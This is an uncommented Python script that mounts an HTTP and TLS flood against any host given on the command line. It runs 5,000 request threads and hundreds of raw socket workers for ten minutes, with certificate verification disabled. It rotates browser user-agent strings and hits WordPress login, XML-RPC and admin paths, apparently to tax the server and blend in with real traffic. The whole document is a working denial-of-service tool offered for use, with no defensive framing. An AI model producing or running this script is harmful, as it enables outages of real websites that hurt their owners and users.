import sys, requests, threading, time, random, socket, ssl
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings()

H = sys.argv[1].replace("https://","").replace("http://","")
T = f"https://{H}"
W = 5000
D = 600
s = 0
f = 0
lk = threading.Lock()

ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15",
]
pth = ["/","/wp-admin","/wp-login.php","/xmlrpc.php","/wp-json","/admin","/login","/api","/search","/feed"]

def w1():
    global s,f
    ss = requests.Session()
    while time.time() < e:
        try:
            ss.get(T+random.choice(pth),headers={"User-Agent":random.choice(ua),"Accept":"*/*","Connection":"keep-alive"},timeout=3,verify=False)
            with lk: s+=1
        except:
            with lk: f+=1

def w2():
    global s
    while time.time() < e:
        try:
            sk = socket.socket()
            sk.settimeout(2)
            sk.connect((H,443))
            sk = ssl.create_default_context().wrap_socket(sk,server_hostname=H)
            sk.send(f"GET / HTTP/1.1\r\nHost: {H}\r\nConnection: keep-alive\r\n\r\n".encode())
            sk.close()
            with lk: s+=1
        except: pass

e = time.time()+D
print(f"T:{T} | W:{W} | 10m")

with ThreadPoolExecutor(max_workers=W) as ex:
    for _ in range(W): ex.submit(w1)
for _ in range(500): threading.Thread(target=w2,daemon=True).start()

while time.time() < e:
    rt = int(e-time.time())
    print(f"S:{s} F:{f} | {rt//60}m{rt%60}s",end="\r")
    time.sleep(1)
print(f"\nDONE S:{s} F:{f}")
